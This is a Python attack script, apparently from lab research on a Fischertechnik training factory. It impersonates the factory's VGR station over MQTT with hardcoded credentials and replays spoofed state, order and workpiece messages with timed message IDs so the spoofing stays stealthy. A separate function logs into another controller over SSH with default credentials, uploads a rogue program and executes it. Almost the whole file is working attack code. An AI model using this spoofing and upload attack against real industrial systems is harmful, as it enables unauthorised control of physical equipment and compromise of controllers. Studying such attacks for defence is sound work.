import random
import time
import threading
from datetime import timezone, datetime
import logging
import json

from scapy.contrib import mqtt
import scapy.all as scapy

import sqlite3
import paho.mqtt.client as mqtt

from paramiko import SSHClient
from paramiko.client import AutoAddPolicy
from scp import SCPClient

logger = logging.getLogger("attack_order")
logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO)

"Starting"
# First we definee variables
src_ip = "192.168.0.105"
dst_ip = "192.168.0.10"
dst_port = 1883

msgid_received_order = 9999999999999999999999999999999999999
order_received = False


def second_attack():
    print("Starting file upload attack on 192.168.0.13")
    server = '192.168.0.13'
    port = '22'
    username = password = 'ROBOPro'

    # create ssh object and connect
    ssh = SSHClient()
    ssh.load_host_keys('/home/kali/.ssh/known_hosts')
    ssh.set_missing_host_key_policy(AutoAddPolicy)
    ssh.connect(server, port, username, password, look_for_keys=False, allow_agent=False)

    # hijack the established tcp/ssh connection and copy files
    scp = SCPClient(ssh.get_transport())
    path = '/home/kali/fischer/vgr/C-Program/'
    # now copy the rogue program
    scp.put(f'{path}TxtParkPosVGR', '.')

    # now run the rogue program
    ssh.exec_command('./TxtParkPosVGR')
    time.sleep(7)
    ssh.connect(server, port, username, password, look_for_keys=False, allow_agent=False)
    ssh.exec_command('./TxtParkPosVGR')
    print("Finished file upload attack on 192.168.0.13")


thread = threading.Thread(target=second_attack)


def state(active, code, description="", station="vgr", target=None):
    if target is None:
        data = '{\n\t"active" : %s,\n\t"code" : %s,\n\t"description" : "%s",\n\t' \
               '"station" : "%s",\n\t' % (active, code, description, station)
        data += new_ts()
    else:
        data = '{\n\t"active" : %s,\n\t"code" : %s,\n\t"description" : "%s",\n\t' \
           '"station" : "%s",\n\t"target" : "%s",\n\t' % (active, code, description, station, target)
        data += new_ts()
    return data


def new_ts():
    # function to generate new timestamps
    ts = datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%S.%f')[:-3] + 'Z'
    ts_ = f'"ts" : "{ts}"\n' + '}'
    return ts_


# what happens if a ConnAct packet is received? Then we subscribe
def on_connect(client, *lis):
    # IF a ConnAck is received, then we subscribe to our packets of interest as VGR
    [client.subscribe(x) for x in
     ("f/o/state/ack", "f/o/order", "f/o/nfc/ds", "fl/ssc/joy", "fl/mpo/ack", "fl/hbw/ack", "fl/sld/ack")]
    print("Chunk subscribe done")
    logger.info("Subscription to topics of interest done")
    time.sleep(0.1)
    # Now we publish our fir
    data = '{\n\t"hardwareId" : "50F14AE8CF8D",\n\t"message" : "init",\n\t"softwareName" : "TxtFactoryVGR",\n\t' + \
           '"softwareVersion" : "0.8.1",\n\t"station" : "VGR",\n\t' + new_ts()
    client.publish("fl/broadcast", data, qos=1)

    # Because at this point, 8 packets get sent out, it means the msgid will be 8. We then set userdata as 8 since userdata will be used to simulate mids after legitimate mid of 32
    # Why? At some point along the attack, we will have to wait for an ORDER event before we continue attacking. This
    # wil mean having to resume the attack such a way that looks like there was no pause in the attack (i.e, simulate that msg
    # IDs do not change).
    client.user_data_set(8)
# #---


# What happens if a SubAck is received?
def on_subscribe(client, *lis):
    pass


# What happens when a publish message is sent from us and a puback has been received
def on_publish(client, userdata, msgid, *rest):
    global msgid_received_order

    # variable to simulate legitimate msgid just for the purposes of our code
    msgid_sim = client.user_data_get()

    match msgid_sim:
        case 8:
            time.sleep(0.4)
            # Publish for f/i/state/hbw
            data = '{\n\t"active" : "0",\n\t"code" : "0",\n\t"description" : "",\n\t' + \
                   '"station" : "hbw",\n\t' + new_ts()
            client.publish("f/i/state/hbw", data, qos=1)
            client.user_data_set(client.user_data_get()+1)

        case 9:
            # Publish for f/i/state/mpo
            data = '{\n\t"active" : "0",\n\t"code" : "0",\n\t"description" : "",\n\t' + \
                   '"station" : "mpo",\n\t' + new_ts()
            client.publish("f/i/state/mpo", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 10:
            # Publish for f/i/state/sld
            data = '{\n\t"active" : "0",\n\t"code" : "0",\n\t"description" : "",\n\t' + \
                   '"station" : "sld",\n\t' + new_ts()
            client.publish("f/i/state/sld", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 11:
            # Publish for f/i/state/vgr
            data = '{\n\t"active" : "0",\n\t"code" : "0",\n\t"description" : "",\n\t' + \
                   '"station" : "vgr",\n\t"target" : "hbw"\n\t' + new_ts()
            client.publish("f/i/state/vgr", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 12:
            data = '{\n\t"active" : "0",\n\t"code" : "0",\n\t"description" : "",\n\t' + \
                   '"station" : "vgr",\n\t"target" : "mpo"\n\t' + new_ts()
            client.publish("f/i/state/vgr", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 13:
            data = '{\n\t"active" : "0",\n\t"code" : "0",\n\t"description" : "",\n\t' + \
                   '"station" : "vgr",\n\t"target" : "dso"\n\t' + new_ts()
            client.publish("f/i/state/vgr", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 14:
            data = '{\n\t"active" : "0",\n\t"code" : "0",\n\t"description" : "",\n\t' + \
                   '"station" : "vgr",\n\t"target" : "dsi"\n\t' + new_ts()
            client.publish("f/i/state/dsi", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 15:
            data = state("0", "0", description="", station="dso")
            client.publish("f/i/state/dso", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 16:
            data = '{\n\t"state" : "WAITING_FOR_ORDER",\n\t' + new_ts()[:-2] + ',\n\t"type" : "NONE"\n}'
            client.publish("f/i/order", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 17:
            data = '{\n\t"history" : null,\n\t' + new_ts()[:-2] + ',\n\t"workpiece" : \n\t{\n\t\t"id" : "",\n\t\t' \
                   '"state" : "RAW",\n\t\t"type" : "NONE"\n\t}\n}'
            client.publish("f/i/nfc/ds", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        # Case bundle for situation where same information (active=0,code=1) is sent in f/i/state/vgr
        case 18 | 23 | 26 | 27 | 28:
            (active, code) = (1, 2) if msgid in [18, 26] else (0, 1)
            data = state(active, code, "", "vgr", "")
            client.publish("f/i/state/vgr", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 19 | 21 | 24 | 29 | 31 | 61 | 66 | 68 | 81 | 89 | 98 | 103 | 108 | 110:
            if msgid == 81:
                time.sleep(2)
            if msgid == 98:
                time.sleep(2)
            data = state(0, 1, "", "dsi")
            client.publish("f/i/state/dsi", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 20 | 22 | 25 | 30 | 32 | 62 | 67 | 69 | 99 | 104 | 109 | 111:
            data = state(0, 1, "", "dso")
            client.publish("f/i/state/dso", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 33:
            # wait for an ORDER event to trigger from the local broker (see the on_message() function for more)
            # while waiting, we just keep sending VGR state information
            client.user_data_set(-1)  # where -1 is just user defined so that the case will always default to `case -1`
            # (where nothing will happen) until user_data_set is used in the on_message() function
            logger.info("Listening for order")

        case 34:
            data = '{\n\t"code" : 3,\n\t' + new_ts()[:-2] + \
                   ',\n\t"workpiece" : \n\t{\n\t\t"id" : "",\n\t\t"state" : "RAW",\n\t\t"type" : "WHITE"\n\t}\n}'
            client.publish("fl/vgr/do", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)
            # time.sleep(50)
            # thread.start()


        # case block to handle bulk cases where active, code, target is 0,1,hbw respectively
        case 35 | 38 | 40 | 41 | 42 | 44 | 46 | 48:
            if msgid == 38:
                time.sleep(7)
            if msgid == 40:
                time.sleep(1)
            if msgid == 41:
                time.sleep(1.5)
            if msgid == 42:
                time.sleep(10)
            if msgid == 46:
                time.sleep(0.2)
            if msgid == 48:
                time.sleep(1)
                
            data = state(0, 1, "", "vgr", "hbw")
            client.publish("f/i/state/vgr", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

    # case block to handle bulk cases where active, code, target is 1,2,hbw respectively
        case 36 | 37 | 39 | 40 | 42 | 45 | 47:
            if msgid == 37:
                time.sleep(2)
            if msgid == 43:
                client.user_data_set(-1)  # where -1 is just user defined so that the case will always default to `case -1`
                # (where nothing will happen) until user_data_set is used in the on_message() function

            #     time.sleep(3.5)
            if msgid == 45:
                time.sleep(2)

            data = state(1, 2, "", "vgr", "hbw")
            client.publish("f/i/state/vgr", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 49:
            data = '{\n\t"code" : 4,\n\t' + new_ts()[:-2] + \
                   ',\n\t"workpiece" : \n\t{\n\t\t"id" : "",\n\t\t"state" : "RAW",\n\t\t"type" : "WHITE"\n\t}\n}'
            client.publish("fl/vgr/do", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        # case block to handle bulk cases where active, code, target is 0,1,mpo respectively
        case 50 | 53 | 55 | 56 | 64 | 65 | 70 | 71 | 72 | 73 | 74:
            if msgid == 53:
                time.sleep(3.8)
            if msgid == 56:
                time.sleep(6)
            if msgid == 60:
                time.sleep(5.5)
            if msgid == 70:
                time.sleep(2.8)
            if msgid in [71, 72, 73, 74]:
                time.sleep(10)
            if msgid == 75:
                client.user_data_set(-1)

            data = state(0, 1, "", "vgr", "mpo")
            client.publish("f/i/state/vgr", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        # case block to handle bulk cases where active, code, target is 1,2,mpo respectively
        case 51 | 52 | 54 | 59 | 63:
            if msgid == 52:
                time.sleep(2)
            data = state(1, 2, "", "vgr", "mpo")
            client.publish("f/i/state/vgr", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 57:
            data = '{\n\t"state" : "IN_PROCESS",\n\t' + new_ts()[:-2] + ',\n\t"type" : "WHITE"\n}'
            client.publish("f/i/order", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 58:
            data = '{\n\t"code" : 7,\n\t' + new_ts()[:-2] + \
                   ',\n\t"workpiece" : \n\t{\n\t\t"id" : "",\n\t\t"state" : "RAW",\n\t\t"type" : "WHITE"\n\t}\n}'
            client.publish("fl/vgr/do", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        # case block to handle bulk cases where active, code, target is 0,1,dso respectively
        case 76 | 78 | 80 | 84 | 86 | 87 | 92 | 94 | 102 | 106 | 107:
            if msgid == 78:
                time.sleep(3.3)
            if msgid == 92:
                time.sleep(0.6)
            data = state(0, 1, "", "vgr", "dso")
            client.publish("f/i/state/vgr", data, qos=1)
            # if msgid == 107:
            #     # then we wait to be sure the SSH attack is done
            #     thread.join()
            client.user_data_set(client.user_data_get() + 1)

        # case block to handle bulk cases where active, code, target is 1,2,dso respectively
        case 77 | 79 | 83 | 85 | 91 | 93 | 96 | 105:
            if msgid == 96:
                time.sleep(4.5)
            data = state(1, 2, "", "vgr", "dso")
            client.publish("f/i/state/vgr", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 82 | 90:
            data = state(1, 1, "", f"dso")
            client.publish("f/i/state/dso", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 88:
            time.sleep(1)
            data = '{\n\t"history" : \n\t[\n\t\t{\n\t\t\t"code" : 800,\n\t\t\t' + new_ts()[:-2] + '\n\t\t}\n\t],\n\t' + \
            new_ts()[-2] + ',\n\t"workpiece" : \n\t{\n\t\t"id" : "048e9b92186581",\n\t\t"state" : "PROCESSED",\n\t\t"type" : "WHITE"\n\t}\n}'
            client.publish("f/i/nfc/ds", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 97:
            data = '{\n\t"state" : "SHIPPED",\n\t' + new_ts()[:-2] + ',\n\t"type" : "WHITE"\n}'
            client.publish("f/i/order", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 100 | 101:
            data = '{\n\t"state" : "WAITING_FOR_ORDER",\n\t' + new_ts()[:-2] + ',\n\t"type" : "WHITE"\n }'
            client.publish("f/i/order", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case -1:
            pass


        # case to send f/i/state/vgr information every 10 seconds when there is no process to fufill in FL
        case _:
            time.sleep(10)
            data = state(0, 1, "", "vgr", "hbw")
            client.publish("f/i/state/vgr", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)



# What happens if a Publish Message is received? Then we send PubAck
# Update: This function just prints output for now, it may come in useful when I have set my IP to that of the VGR
def on_message(client, userdata, mqttmsg):
    mqttpayload = json.loads(mqttmsg.payload.decode('utf-8'))  # decode mqtt payload to string and convert to json
    # client.ack(mid=mqttmsg.mid, qos=client.q)
    print(mqttpayload)

    # -------------------
    print(f"""A publish message was received from broker with the following signature
    Client: {dir(client)}
    -------------------------
    Other: {dir(mqttmsg)}""")

    #UPdate: the below client.ack doesn't kick in because I have not set manual_ack=True in client.connect
    #client.ack(mid=mqttmsg.mid, qos=1)  #-- plan here is to take the mid and qos from the received message and place here

    if mqttmsg.topic == "f/o/order":
        logger.info("Order received from Dashboard via broker")

        order_color = mqttpayload['type']
        print("Ordered color is: " + order_color)
        logger.info("Ordered color is: " + order_color)


        data = '{\n\t"state" : "ORDERED",\n\t' + new_ts()[:-2] + ',\n\t"type" : "WHITE"\n}'
        #global msgid_received_order, order_received
        client.publish("f/i/order", data, qos=1)
        client.user_data_set(34)
        #order_received = True
        #print("HAVE A LOOK HERE. You left this open to handle the case of when the broker publishes an order"
              #"to 192.168.0.13 via f/o/order, so you can then begin your stealthy attack with f/i/order at id 34")

    if mqttmsg.topic == "fl/hbw/ack" and mqttpayload["code"] == 1:
        data = state(1, 2, "", "vgr", "hbw")
        client.publish("f/i/state/vgr", data, qos=1)
        client.user_data_set(44)

    if mqttmsg.topic == "fl/mpo/ack" and mqttpayload["code"] == 2:
        data = state(0, 1, "", "vgr", "mpo")
        client.publish("f/i/state/vgr", data, qos=1)
        client.user_data_set(76)



mqtt_connect = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id='TxtFactoryVGRV0.8.1', clean_session=True, protocol=mqtt.MQTTv31, userdata=0)
mqtt_connect.username_pw_set('txt', 'xtx')  # turns out connection happens without txt
mqtt_connect.connect(host=dst_ip, port=dst_port, keepalive=60)


mqtt_connect.on_connect = on_connect
mqtt_connect.on_subscribe = on_subscribe
mqtt_connect.on_publish = on_publish
mqtt_connect.on_message = on_message  #-- use this if manual_ack==True is ever set in mqtt.Client



mqtt_connect.loop_forever()